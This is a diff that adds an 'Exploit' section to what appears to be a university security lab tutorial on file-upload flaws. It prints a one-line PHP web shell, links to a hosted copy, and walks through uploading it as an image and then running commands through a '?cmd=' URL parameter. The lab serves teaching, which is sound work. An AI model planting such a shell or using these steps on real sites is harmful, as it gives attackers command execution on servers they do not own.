@@ -15,3 +15,32 @@ Cool right?
 Now here is the part that Alice and Bob want you to pay close attention to...
 
 ## Exploit
+We want you to download this file below...
+
+> <a href="https://udel.codes/cyber2/Hack.php" target="_blank">Hacky File</a>
+
+The contents of this file are the following
+
+`<? print_r(system($_GET['cmd'])); ?>`
+
+What this line of code does is it allows for us to inject (enter) bash commands into the url. These bash commands can do all types of malicious things such as go list all the files the website contains, delete files, ect. We could destroy the website if we wanted to!
+> But we won't do that cause we are not the L33k3ers!
+
+Now that you know what know what this file does, upload that file just as you did with your dessert image
+
+Once you do that, you will be directed to a page that says **Warning**, and underneath of that will be a little question mark image.
+
+Right click on this image and select, **"Open Link in new Tab"**
+
+Once at the new webpage, go to the url and at the very end put this statement...
+
+`?cmd=ls`
+
+Hit enter, and now you see a list of all the files that the website contains! Crazy right! 
+
+
+
+
+
+
+
